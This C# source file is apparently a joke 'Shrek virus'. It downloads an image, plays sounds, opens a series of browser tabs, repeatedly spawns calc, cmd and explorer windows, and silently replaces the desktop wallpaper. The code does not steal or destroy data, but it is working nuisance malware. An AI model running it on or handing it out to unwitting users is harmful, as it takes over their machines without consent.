using System;
using System.Diagnostics;
using System.Media;
using System.Net;
using System.Runtime.InteropServices;
using System.Threading;

namespace ShrekVirus
{
    class Program
    {
        [DllImport("User32", CharSet = CharSet.Auto)]
        public static extern int SystemParametersInfo(int uiAction, int uiParam,
            string pvParam, uint fWinIni);

        static void Main(string[] args)
        {
            var user = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
            using (WebClient client = new WebClient())
            {
                client.DownloadFile(new Uri("https://i.imgur.com/YaryvoN.jpg"), $@"{user}\Desktop\shrek.jpg");
            }

            GenerateFiles.GenerateFile();


            SoundPlayer player = new SoundPlayer("shreksong.wav");
            player.Play();



            Thread.Sleep(1000);
            Process.Start("https://i.kym-cdn.com/photos/images/newsfeed/000/779/581/e7a.png");
            Thread.Sleep(3000);
            Process.Start("http://patorjk.com/software/taag/#p=display&f=Graffiti&t=the%20world%20is%20gonna%20roll%20me");
            Thread.Sleep(7000);
            Process.Start("http://i.ebayimg.com/00/s/Mzc1WDUwMA==/z/b64AAOxyBjBTWHjI/$_3.JPG?set_id=2");
            Thread.Sleep(2700);
            Process.Start("calc.exe");
            Thread.Sleep(1500);
            Process.Start("cmd.exe");
            Thread.Sleep(1500);
            Process.Start("explorer.exe");
            Thread.Sleep(1500);
            Process.Start("calc.exe");
            Thread.Sleep(1500);
            Process.Start("cmd.exe");
            Thread.Sleep(1500);
            Process.Start("calc.exe");
            Thread.Sleep(1500);
            Process.Start("cmd.exe");
            Thread.Sleep(1500);
            Process.Start("calc.exe");
            Thread.Sleep(1500);
            Process.Start($@"{user}\Desktop\well.txt");
            Thread.Sleep(5000);
            Process.Start("https://a.wattpad.com/cover/58573738-352-k508495.jpg");
            Thread.Sleep(5000);
            SystemParametersInfo(0x0014, 0, $@"{user}\Desktop\shrek.jpg", 0x0001);
            Process.Start("https://i.imgur.com/cKuz6mJ.png");


            //Process.Start("x");
            //Thread.Sleep(5000);


            Thread.Sleep(240000);
            SoundPlayer player2 = new SoundPlayer("t.wav");
            player2.Play();
            Thread.Sleep(2000);
        }
    }
}
